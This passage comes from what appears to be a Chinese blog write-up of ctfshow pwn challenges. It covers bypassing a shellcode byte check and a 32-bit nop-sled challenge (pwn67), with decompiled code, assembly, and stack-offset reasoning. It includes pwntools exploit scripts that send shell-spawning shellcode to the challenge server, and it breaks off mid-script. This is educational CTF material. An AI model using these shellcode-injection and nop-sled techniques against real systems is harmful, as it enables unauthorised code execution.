(0x400000)\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  _BYTE <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  buf <span class=\"token operator\">=</span> <span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1000uLL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Your shellcode is :\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x200uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">check</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\" ERROR !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>__fastcall <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>仍然是写入 shellcode，但是这里有一个 check：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 __fastcall <span class=\"token function\">check</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  _BYTE <span class=\"token operator\">*</span>i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-10h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">*</span>a1 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>unk_400F20<span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>i <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">*</span>i <span class=\"token operator\">!=</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>      <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span><span class=\"token operator\">*</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token operator\">++</span>a1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">1LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们要使他返回 1 才能顺利执行 shellcode，所以要跳出循环，*a1=0 就可以跳出，所以我们的 shellcode 第一个字节要为 <code>\\x00</code> ，利用脚本查找第一个字节为 <code>\\x00</code>  的指令</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> itertools <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> product<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>p8<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>repeat<span class=\"token operator\">=</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#there are as well as  twice 'for()',it </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">+</span><span class=\"token string\">b\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        p<span class=\"token operator\">=</span>disasm<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            p <span class=\"token operator\">!=</span><span class=\"token string\">\"    ...\"</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">and</span> <span class=\"token keyword\">not</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">r\"\\[\\w*?\\]\"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">and</span> <span class=\"token string\">\".byte\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token comment\">#input()</span></pre></td></tr></table></figure><p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E5%9B%BE%E5%BA%8A/2%2486%60%40TG%7E9H6%25A8KY52GPXM.png\" alt=\"\" /></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#e=ELF('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28293</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\xc0'</span><span class=\"token operator\">+</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn67-nop-sled-shellcode\"><a class=\"anchor\" href=\"#pwn67-nop-sled-shellcode\">#</a> pwn67 （nop sled  -&gt;shellcode）</h1>\n<h2 id=\"1题目\"><a class=\"anchor\" href=\"#1题目\">#</a> 1. 题目</h2>\n<p>题目描述： <code>32bit nop sled</code></p>\n<p>32 位程序，有可执行段，但是有 canary</p>\n<pre><code>Arch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX disabled\nPIE:      No PIE (0x8048000)\nRWX:      Has RWX segments\n</code></pre>\n<p><code>main函数:</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// bad sp value at call has been detected, the output may be wrong!</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// eax</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+0h] [ebp-1010h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> seed<span class=\"token punctuation\">[</span><span class=\"token number\">1027</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4h] [ebp-100Ch] BYREF</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  seed<span class=\"token punctuation\">[</span><span class=\"token number\">1025</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  seed<span class=\"token punctuation\">[</span><span class=\"token number\">1024</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">__readgsdword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">Loading</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">acquire_satellites</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">query_position</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We need to load the ctfshow_flag.\\nThe current location: %p\\n\"</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What will you do?\\n> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>seed<span class=\"token punctuation\">,</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Where do you start?\\n> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%p\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token function\">v5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Loading 函数和 acquire_satellites () 函数就是起一个等待的作用，没什么用</p>\n<p><code>query_position()函数：</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">query_position</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+3h] [ebp-15h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+4h] [ebp-14h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+8h] [ebp-10h]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-Ch]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token function\">__readgsdword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x14u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">1337</span> <span class=\"token operator\">-</span> <span class=\"token number\">668</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span>v1 <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>v1 <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在 main 函数会给我们一个被偏移过的栈地址（v3），然后让我们输入 seed，利用最后的 <code>__isoc99_scanf(&quot;%p&quot;, &amp;v5);</code>  让我们输入地址，然后就执行这个地方的命令</p>\n<h2 id=\"2漏洞分析\"><a class=\"anchor\" href=\"#2漏洞分析\">#</a> 2. 漏洞分析</h2>\n<p>在 query_position 函数里，返回的值是 v1 的地址 + v2 这个随机数，v1 是栈上的地址，那么就能通过大致计算出 v1 的地址来确定我们需要执行的 shellcode 的输入位置，但是无法准确的计算出 shellcode 的地址，那么就需要利用 <code>nop sled</code>  (空操作雪橇)，下滑到 shellcode 的位置执行</p>\n<p>具体 <code>sled</code>  操作需要利用汇编来看：</p>\n<pre><code class=\"language-asm\">.text:08048945 ; __unwind &#123;\n.text:08048945                 lea     ecx, [esp+4]\n.text:08048949                 and     esp, 0FFFFFFF0h\n.text:0804894C                 push    dword ptr [ecx-4]\n.text:0804894F                 push    ebp\n.text:08048950                 mov     ebp, esp\n.text:08048952                 push    ebx\n.text:08048953                 push    ecx\n.text:08048954                 sub     esp, 1010h\n.text:0804895A                 call    __x86_get_pc_thunk_bx\n.text:0804895F                 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)\n.text:08048965                 mov     eax, large gs:14h\n.text:0804896B                 mov     [ebp+var_C], eax\n.text:0804896E                 xor     eax, eax\n.text:08048970                 mov     eax, ds:(stdout_ptr - 804B000h)[ebx]\n.text:08048976                 mov     eax, [eax]\n.text:08048978                 sub     esp, 8\n.text:0804897B                 push    0               ; buf\n.text:0804897D                 push    eax             ; stream\n.text:0804897E                 call    _setbuf\n.text:08048983                 add     esp, 10h\n.text:08048986                 call    logo\n.text:0804898B                 lea     eax, [ebp+seed]\n.text:08048991                 sub     esp, 0Ch\n.text:08048994                 push    eax             ; seed\n.text:08048995                 call    _srand\n.text:0804899A                 add     esp, 10h\n.text:0804899D                 call    Loading\n.text:080489A2                 call    acquire_satellites\n.text:080489A7                 call    query_position\n.text:080489AC                 sub     esp, 8\n.text:080489AF                 push    eax\n.text:080489B0                 lea     eax, (aWeNeedToLoadTh - 804B000h)[ebx] ; &quot;We need to load the ctfshow_flag.\\nThe &quot;...\n.text:080489B6                 push    eax             ; format\n.text:080489B7                 call    _printf\n.text:080489BC                 add     esp, 10h\n.text:080489BF                 sub     esp, 0Ch\n.text:080489C2                 lea     eax, (aWhatWillYouDo - 804B000h)[ebx] ; &quot;What will you do?\\n&gt; &quot;\n.text:080489C8                 push    eax             ; format\n.text:080489C9                 call    _printf\n.text:080489CE                 add     esp, 10h\n.text:080489D1                 mov     eax, ds:(stdin_ptr - 804B000h)[ebx]\n.text:080489D7                 mov     eax, [eax]\n.text:080489D9                 sub     esp, 4\n.text:080489DC                 push    eax             ; stream\n.text:080489DD                 push    1000h           ; n\n.text:080489E2                 lea     eax, [ebp+seed]\n.text:080489E8                 push    eax             ; s\n.text:080489E9                 call    _fgets\n.text:080489EE                 add     esp, 10h\n.text:080489F1                 sub     esp, 0Ch\n.text:080489F4                 lea     eax, (aWhereDoYouStar - 804B000h)[ebx] ; &quot;Where do you start?\\n&gt; &quot;\n.text:080489FA                 push    eax             ; format\n.text:080489FB                 call    _printf\n.text:08048A00                 add     esp, 10h\n.text:08048A03                 sub     esp, 8\n.text:08048A06                 lea     eax, [ebp+var_1010]\n.text:08048A0C                 push    eax\n.text:08048A0D                 lea     eax, (aP - 804B000h)[ebx] ; &quot;%p&quot;\n.text:08048A13                 push    eax\n.text:08048A14                 call    ___isoc99_scanf\n.text:08048A19                 add     esp, 10h\n.text:08048A1C                 mov     eax, [ebp+var_1010]\n.text:08048A22                 call    eax\n.text:08048A24                 mov     eax, 0\n.text:08048A29                 mov     edx, [ebp+var_C]\n.text:08048A2C                 xor     edx, large gs:14h\n.text:08048A33                 jz      short loc_8048A3A\n.text:08048A35                 call    __stack_chk_fail_local\n\n</code></pre>\n<p>首先  <code>push ebp</code>  使 esp-4；然后 <code>push ebx; push ecx;</code> esp 变为：esp-4-4-4；接着 <code>sub esp,0x1010</code>  使 esp-4-4-4-0x1010；然后有 <code>sub esp,8；push 0;push eax;</code>  使 esp-4-4-4-0x1010-8-4-4；在 call _setbuf 的下一条指令有 <code>add esp,0x10</code>  使 esp-4-4-4-0x1010-8-4-4+0x10；后面有 <code>sub esp,0xc</code>  使 esp-4-4-4-0x1010-8-4-4+0x10-0xc；然后 <code>push eax ; ... ; add esp,0x10 </code> 使 esp-4-4-4-0x1010-8-4-4+0x10-0xc-4+0x10=esp-0x101c；【这里到了 <code>query_position</code> 】</p>\n<p>后面的其实已经不用算了：接着 <code>sub esp,8,push eax; ... ; push eax;</code>  使 esp-4-4-4-0x1010-8-4-4+0x10-0xc-4+0x10-0x8-4-4=esp-0x102c，到了第一个 call printf 下面 <code>add esp,0x10;sub esp,0xc ;... ; push eax</code>  使 esp=esp-0x102c+0x10-0xc-4 ; 第二个 call printf 下面 <code>add esp,0x10; ... ; sub esp,4; push eax;push 1000h; ... ; push eax</code>  esp=esp-0x102c+0x10-0xc-4+0x10-4-4-4-4=esp-0x102c；到了 call fgets 下面 <code>add esp ,0x10; sub esp ,0xc ; push eax;</code>  esp=esp-0x102c+0x10-0xc-4=esp -0x102c；在最后一个 call printf 下 <code>add esp,0x10; sub esp ,8;...; push eax; push eax;</code>  esp=esp-0x102c+0x10-8-4-4=0x102c ; 最后的 call scanf  <code>add esp ,0x10</code>  esp=esp-0x102c+0x10=esp-0x101c</p>\n<p>而 输入的 seed 距离 main 的 ebp 为 0x100c</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/04RK81R%60%25%60ZD_%5D0%5B0D99%253J.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/YS%253ATQAXL%296XBY6PRM%282PT.png\" alt=\"\" /></p>\n<p>我们能通过 v1 的地址来得到 seed 的地址，而函数给我们输出了 <code>v1地址+一个随机数的值</code> ，这个随机数是 <code>v2 = rand() % 1337 - 668;</code> 【-668~688】，意味着 <code>v1的地址-最大的可能668-与seed的偏移</code> 就一定会在输入的 seed 中：</p>\n<p>x=&amp;v1+random（x 为给出来的地址）<br />\nseed=&amp;v1+0x29（0x1035-0x100c=0x29//0x2c?）</p>\n<p>seed=x-random+0x29【只要假设 <code>减掉的</code>  random 最大，也就是 seed 地址处于最高地址的情况（random 取 <code>负668</code> ）】</p>\n<p><code>seed=x+668+0x29</code>  但是如果这个地方不是我们真的存放 shellcode 的位置，那么可能无法执行 shellcode（因为是假设 seed 为所在范围最高的地址），我们要保障输入的 shellcode 一定要超过这个位置，以免真实地址大于我们输入的 shellcode 的地址；</p>\n<p>因为 seed 可能的最低地址为 <code>seed=x-668+0x29</code>  所以我们需要在这个区间内利用 <code>nop</code>  命令来填充 1136 个字节（第 1137 个可以刚好执行，并且可以输入 4096 个字节，不用担心大小不够），以确保能够执行在这个 <code>范围外(指seed的最低地址与最高地址)</code>  部的 <code>shellcode</code></p>\n<p>【这个地方也就是意味着计算出来的 seed 在这个范围内都有可能，那么我们就必须保障 shellcode 超出这个范围，因为执行的 v5 地址在 shellcode 后面或者中间，就无法正确 getshell】</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token 